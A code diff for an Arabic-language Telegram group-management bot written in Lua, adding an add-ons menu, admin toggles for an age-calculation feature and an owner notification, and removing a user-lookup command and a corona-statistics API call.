 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -14698,6 +14713,47 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 return false
 end
 ----------------------------------------------------------------------------
+if text == ' ' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,' ')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local Text =[[
+*اهلا انتツفي اضافات البوت*
+*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ*
+* يمكنك معرفة حاله تفعيل الاضافات *
+* من خلال ارسال حاله الاضافات *
+*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
+*يمكنك تصفح الاضافات من خلال*
+*الكيبورد الموجود في الأسفل*
+*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
+⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/sofi"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
+},
+{
+{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
+},
+{
+{text = '𓆩𝑷𝑶𝑾𝑬𝑹𓆪', url="t.me/SOPOWERB0T"},
+},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
+end
 if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
 data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
 if res == 200 then
@@ -14775,18 +14831,6 @@ t = t..i.."-  `"..v.."` \n"
 end
 send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
 end
-if text and text:match('^كشف (%d+)$') then 
-local id = text:match('^كشف (%d+)$') 
-local text = 'وجدت العضو اضغط هنا' 
-tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil) 
-local text = 'لم يتم العثور علي العضو' 
-end 
-local function oChat(chat_id,cb) 
-tdcli_function ({ 
-ID = "OpenChat", 
-chat_id_ = chat_id 
-}, cb, nil) 
-end
 if text and text:match("^زخرفه (.*)$") then
 local TextZhrfa = text:match("^زخرفه (.*)$")
 zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
@@ -14798,17 +14842,6 @@ i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
 send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
-end
-if text and text:match("^كرونا (.*)$") then
-local TextCrona = text:match("^كرونا (.*)$")
-co = https.request('http://amerajo.tk/api_saikoo/api.php?corona='..TextCrona..'')
-cr = JSON.decode(co)
-i = 0
-for k,v in pairs(cr.ok) do
-i = i + 1
-t = v.."\n"
-end
-send(msg.chat_id_, msg.id_, t)
 end
 if text and text:match("^برج (.*)$") then
 local Textbrj = text:match("^برج (.*)$")
@@ -14826,6 +14859,22 @@ local TextName = text:match("^معني (.*)$")
 gk = https.request('http://sonicx.ml/Api/Name.php?Name='..URL.escape(TextName)..'')
 br = JSON.decode(gk)
 send(msg.chat_id_, msg.id_,br.meaning)
+end
+if text == "تعطيل حساب العمر" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
+send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل حساب العمر')
+database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"close")
+end
+if text == "تفعيل حساب العمر" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
+send(msg.chat_id_, msg.id_,'☉┇ تم تفعيل حساب العمر')
+database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
 end
 if text and text:match("^احسب (.*)$") then
 local Textage = text:match("^احسب (.*)$")
@@ -16018,6 +16067,7 @@ end
 local text = result.content_.text_
 if not Mod(result) then
 ------------------------------------------------------------------------
+sendText(SUDO,"شكرا لاستخدامك سورس باور\n اضغط /sudo لاظهار كيبورد المطور الاساسي",0,'md')
 if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -16118,6 +16168,7 @@ end
 end
 end,nil)
 ------------------------------------------------------------------------
+
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
